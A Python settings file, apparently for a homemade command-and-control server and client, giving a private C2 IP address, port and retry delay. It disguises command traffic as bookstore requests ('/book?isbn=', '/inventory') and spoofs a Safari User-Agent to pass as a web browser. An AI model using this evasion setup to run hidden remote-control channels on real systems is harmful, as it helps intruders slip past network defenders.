############# For Both Client and Server #############
# Port for the C2 server
PORT = 80

# Path to use for signifying a command Request from a client using HTTP GET
CMD_REQUEST = "/book?isbn="

RESPONSE_PATH = "/inventory"

CWD_RESPONSE = "/title"

RESPONSE_PATH_KEY = "index"

# C2 server IP address
# C2_SERVER = "localhost"
# C2_SERVER = "192.168.2.132"
C2_SERVER = "192.168.100.40"

# ----- For Server ------
# Bind address for the C2 server
BIND_ADDRESS = "0.0.0.0"

# ----- For Client ------
# Set delay between requests if there is a connection error
DELAY = 10

#PROXY = {"https": "your-proxy.com:443"}
PROXY = None

# HTTP header to use for requests (Masquerade as a web browser)
HEADER = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0.1 Safari/605.1.15",
    "Content-Type": "application/x-www-form-urlencoded", 
    "Accept": "text/plain"
}
